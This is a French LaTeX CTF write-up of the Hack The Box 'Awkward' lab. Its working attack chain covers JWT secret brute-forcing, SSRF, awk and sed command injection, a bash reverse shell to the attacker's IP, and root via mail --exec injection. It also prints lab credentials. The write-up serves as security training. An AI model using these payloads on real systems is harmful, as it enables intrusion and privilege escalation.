\chapter{Awkward}
\begin{itemize}
    \item {\bf technics}: SSRF, jwt brute-force
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.185
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

\end{verbatim}

\subsection{http}

\begin{verbatim}
$ ffuf -u http://10.10.11.185 -H 'Host: FUZZ.hat-valley.htb' -w subdomains-top1million-20000.txt -fs 132

store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 51ms]
\end{verbatim}

\subsection{store.hat-valley.htb}
basic auth
\subsection{hat-valley.htb}

tout le contenu passe par le \verb+javascript+

\begin{verbatim}
$ curl -O http://hat-valley.htb/js/app.js
$ grep login app.js sed 's/\\n/\n/g'
...SNIP...
a.post(baseURL + 'login', {
...SNIP...
\end{verbatim}

avec \verb+grep baseURL app.js | sed 's/\\n/\n/g'+:
\begin{verbatim}
axios__WEBPACK_IMPORTED_MODULE_0___default.a.defaults.withCredentials = true;
var baseURL = \"/api/\";

var get_all = function get_all() {
  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.get(baseURL + 'all-leave').then(function (response) {
    return response.data;
  });
};

var submit_leave = function submit_leave(reason, start, end) {
  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.post(baseURL + 'submit-leave', {
    reason: reason,
    start: start,
    end: end
  }).then(function (response) {
    return response.data;
  });
};

var baseURL = \"/api/\";

var login = function login(username, password) {
  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.post(baseURL + 'login', {
    username: username,
    password: password
  }).then(function (response) {
    return response.data;
  });
};


var baseURL = \"/api/\";

var staff_details = function staff_details() {
  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.get(baseURL + 'staff-details').then(function (response) {
    return response.data;
  });
};


var baseURL = \"/api/\";

var store_status = function store_status(URL) {
  var params = {
    url: {
      toJSON: function toJSON() {
        return URL;
      }
    }
  };
  return axios__WEBPACK_IMPORTED_MODULE_0___default.a.get(baseURL + 'store-status', {
    params: params
  }).then(function (response) {
    return response.data;
  });
};
\end{verbatim}


avec \verb+grep routes app.js | sed 's/\\n/\n/g'+:
\begin{verbatim}
var routes = [{
  path: \"/\",
  name: \"base\",
  component: _Base_vue__WEBPACK_IMPORTED_MODULE_3__[\"default\"]
}, {
  path: \"/hr\",
  name: \"hr\",
  component: _HR_vue__WEBPACK_IMPORTED_MODULE_4__[\"default\"]
}, {
  path: \"/dashboard\",
  name: \"dashboard\",
  component: _Dashboard_vue__WEBPACK_IMPORTED_MODULE_5__[\"default\"],
  meta: {
    requiresAuth: true
  }
}, {
  path: \"/leave\",
  name: \"leave\",
  component: _Leave_vue__WEBPACK_IMPORTED_MODULE_6__[\"default\"],
  meta: {
    requiresAuth: true
  }
}];
\end{verbatim}

en allant sur la page \verb+/hr+ on chope un cookie:
\verb+token: guest+

en le settant à \verb+admin+ on bypass l'authentification. 

\begin{verbatim}
$ curl -s -H 'token: admin' http://hat-valley.htb/api/staff-details |jq
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]

$ echo '6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649' | hashid
Analyzing '6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649'
[+] Snefru-256
[+] SHA-256
[+] RIPEMD-256
[+] Haval-256
[+] GOST R 34.11-94
[+] GOST CryptoPro S-Box
[+] SHA3-256
[+] Skein-256
[+] Skein-512(256)

$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt --format=Raw-SHA256 passwords
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=12
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chris123         (?)
1g 0:00:00:01 DONE (2022-12-10 06:10) 1.000g/s 14343Kp/s 14343Kc/s 43128KC/s 01.juli.92..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
$ cat ~/.john/john.pot
$SHA256$e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
\end{verbatim}

\verb+christopher.jones:chris123+


\begin{verbatim}
$ curl -X POST  http://hat-valley.htb/api/login --data-raw '{"username":"christopher.jones","password":"chris123"}' -H 'Content-Type: application/json' -s |jq
{
  "name": "Christopher",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwNjUwMzMwfQ.jRs2p1usdWJb66Iwp2iAXwbmRH0g1zyIoMeapN96Emw"
}
\end{verbatim}

\begin{verbatim}
$ jwt-hack decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwNjUwMzMwfQ.jRs2p1usdWJb66Iwp2iAXwbmRH0g1zyIoMeapN96Emw

INFO[0000] Decoded data(claims) 
    header="{\"alg\":\"HS256\",\"typ\":\"JWT\"}" method="&{HS256 SHA-256}"
INFO[0000] Issued At Time 
    IAT=1670650330 TIME="1970-01-01 01:00:01.67065033 +0100 CET"
{"iat":1670650330,"username":"christopher.jones"}
\end{verbatim}

\begin{verbatim}
$ jwt-tool  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjcwNjUwMzMwfQ.jRs2p1usdWJb66Iwp2iAXwbmRH0g1zyIoMeapN96Emw

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] username = "christopher.jones"
[+] iat = 1670650330    ==> TIMESTAMP = 2022-12-10 06:32:10 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
\end{verbatim}



comme on a l'algo \verb+HS256+ on peut essayer un bruteforce:
\begin{verbatim}
$ hashcat -a 0 -m 16500 jwt.token /usr/share/wordlists/passwords/rockyou.txt
eyJhbGci...SNIP...zyIoMeapN96Emw:123beany123
\end{verbatim}

comme Christine recoit les requets on va se faire passer pour elle

\begin{verbatim}
$ jwt-tool -T -p 123beany123 -S hs256  eyJhb.. .SNIP. ..apN96Emw
.. .SNIP. ..
jwttool_277cb15a643b38ab1470ecb127e11c9c - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdGluZS53b29sIiwiaWF0IjoxNjcwNjUwMzMwfQ.dKOJ_i82l4Hj97BnJ5_uUSuv0zW5uT1SWjs0yV1hZFM
\end{verbatim}

ne donne rien de plus.

on va voir ce que l'on peut faire avec l'api \verb+store-status+
\begin{verbatim}
$ curl http://hat-valley.htb/api/store-status?url=%22http://10.10.16.3/
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.185 - - [10/Dec/2022 07:15:12] "GET / HTTP/1.1" 200 -

$ curl http://hat-valley.htb/api/store-status?url=%22http://127.0.0.1/
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" />
</head>
<body>
</body>
</html>
\end{verbatim}

enumerons les ports ouverts en internes

\begin{verbatim}
$ ffuf -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' 
    -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0

0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 171ms]
3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 119ms]
8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 218ms]
\end{verbatim}

\verb+$ curl http://hat-valley.htb/api/store-status?urtp://127.0.0.1:8080%22+
donne le site 

\verb+$ curl http://hat-valley.htb/api/store-status?urtp://127.0.0.1:3002%22+
3002 donc un truc nouveau du html

la liste des API et le code source
\begin{verbatim}
/api/submit-leave

const finalEntry = user + "," + reason + "," + start + "," + end + ",Pending\r"
exec(`echo "${finalEntry}" >> /var/www/private/leave_requests.csv`, (error, stdout, stderr)

/api/all-leave
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr
\end{verbatim}

on peut peut être faire du LFI
\url{https://gtfobins.github.io/gtfobins/awk/#file-read}


\begin{verbatim}
    LFILE=file_to_read
    awk '//' "$LFILE"
\end{verbatim}

donc il faut passer dans user \verb+/' /etc/passwd '+
et d'après le code :
\begin{verbatim}
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
\end{verbatim}

en se servant de burp pour intercepter les reponses. Sinon il faut modifier le
code ligne 250

\begin{verbatim}
jwt-tool -I -pc username -pv "/' /etc/passwd '" -p 123beany123 -S hs256 \
    -t http://hat-valley.htb/api/all-leave \
    -rc "token=eyJhbGciO.. .SNIP. ..p2iAXwbmRH0g1zyIoMeapN96Emw"
root:x:0:0:root:/root:/bin/bash
.. .SNIP. ..
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
.. .SNIP. ..
\end{verbatim}

En esayant de récup des clés ssh ca ne passe pas

\begin{verbatim}
jwt-tool -I -pc username -pv "/' /home/bean/.bashrc '" .. .SNIP. ..
.. .SNIP. ..
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

$ jwt-tool -I -pc username -pv "/' /home/bean/Documents/backup_home.sh '"
!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
\end{verbatim}

par contre pour celui la avec le binaire galere avec burp donc requete curl:
\begin{verbatim}
$ curl -O http://hat-valley.htb/api/all-leave --header "Cookie:token=eyJhbGci.. .SNIP. ..W4rxou5dk_Ls8pPnmnY"
\end{verbatim}
\begin{verbatim}
$ cat .config/xpad/content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html
\end{verbatim}

\subsection{Foothold}
\subsubsection{bean}
\begin{verbatim}
$ ssh bean@hat-valley.htb
bean@hat-valley.htb's password:
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Sun Oct 23 21:38:08 2022 from 10.10.14.6
bean@awkward:~$
$ ./linpeas.sh -q

bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
\end{verbatim}

en essayant avec \verb+admin:014mrbeanrules!#P+ on peut acceder à
\verb+http://store.hat-valley.htb+


\subsubsection{store.hat-valley.htb}

\begin{verbatim}
$ cd /var/www/store/
bean@awkward:/var/www/store$ ls
cart              cart.php      css    img        js               README.md  static
cart_actions.php  checkout.php  fonts  index.php  product-details  shop.php   style.css
bean@awkward:/var/www/store$ cat README.md
# Hat Valley - Shop Online!

### To Do
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)
3. Implement shop filter
4. Get full catalogue of items

### How to Add New Catalogue Item
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!

\end{verbatim}

\begin{verbatim}
$ cat cart_actions.php

$ cat cart_actions.php
//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
}
\end{verbatim}

donc command injection sur \verb+sed+. \href{https://gtfobins.github.io/gtfobins/sed/}{gtfobins sed}

\begin{verbatim}
$ cat cart/b101-ce81-850-427e
***Hat Valley Cart***
item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
\end{verbatim}

on ne peut pas modifier le fichier directement à cause des droit mais le
repertoire est en \verb+777+

voila le contenu que l'on place dans le cart.
\begin{verbatim}
bean@awkward:/var/www/store/cart$ cat new-cart
***Hat Valley Cart***
item_id=1' -e "1e /tmp/rs.sh" /tmp/rs.sh -e '/jubeaz'&item_name=Yellow

bean@awkward:/var/www/store/cart$ rm -f 29b1-0e52-a4b-161c
bean@awkward:/var/www/store/cart$ cp new-cart 29b1-0e52-a4b-161c

\end{verbatim}

\begin{verbatim}
bean@awkward:/var/www/store/cart$ cat /tmp/rs.sh
#!/bin/bash

sh -i >& /dev/tcp/10.10.16.6/4444 0>&1
bean@awkward:/var/www/store/cart$ chmod +x /tmp/rs.sh
\end{verbatim}


\subsection{www-data}
\begin{verbatim}
$ ./pspy64 
...SNIP...
2023/01/23 19:30:01 CMD: UID=0    PID=14653  | mail -s Leave Request: bean.hill christine 
...SNIP...
\end{verbatim}

\begin{verbatim}
$ cd ~/
$ cd private
$ ls 
leave_requests.csv
$ cat leave_requests.csv
Leave Request Database,,,,
,,,,
HR System Username,Reason,Start Date,End Date,Approved
bean.hill,Taking a holiday in Japan,23/07/2022,29/07/2022,Yes
christine.wool,Need a break from Jackson,14/03/2022,21/03/2022,Yes
jackson.lightheart,Great uncle's goldfish funeral + ceremony,10/05/2022,10/06/2022,No
jackson.lightheart,Vegemite eating competition,12/12/2022,22/12/2022,No
christopher.jones,Donating blood,19/06/2022,23/06/2022,Yes
christopher.jones,Taking a holiday in Japan with Bean,29/07/2022,6/08/2022,Yes
bean.hill,Inevitable break from Chris after Japan,14/08/2022,29/08/2022,No
\end{verbatim}

encore un exploit de binaire mais cette fois-ci mail
\href{https://gtfobins.github.io/gtfobins/mail/}{gtfobins mail}


\begin{verbatim}
$ echo '" --exec="\!/tmp/priv.sh"' >> leave_requests.csv
\end{verbatim}

a chaque fois que l'on touche au fichier la commande est re-exec
\begin{verbatim}
2023/01/23 20:17:52 CMD: UID=0    PID=15295  | mail -s Leave Request: " --exec="\!/tmp/priv.sh" christine 
\end{verbatim}

\begin{verbatim}
bean@awkward:/var/www/store/cart$ cat /tmp/priv.sh 
#!/bin/bash
chmod +s /bin/bash
bean@awkward:/var/www/store/cart$ chmod +x /tmp/priv.sh 
bean@awkward:/var/www/store/cart$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  7  2022 /bin/bash
bean@awkward:/var/www/store/cart$ bash -p
bash-5.1# id
uid=1001(bean) gid=1001(bean) euid=0(root) egid=0(root) groups=0(root),1001(bean)
bash-5.1# 
\end{verbatim}


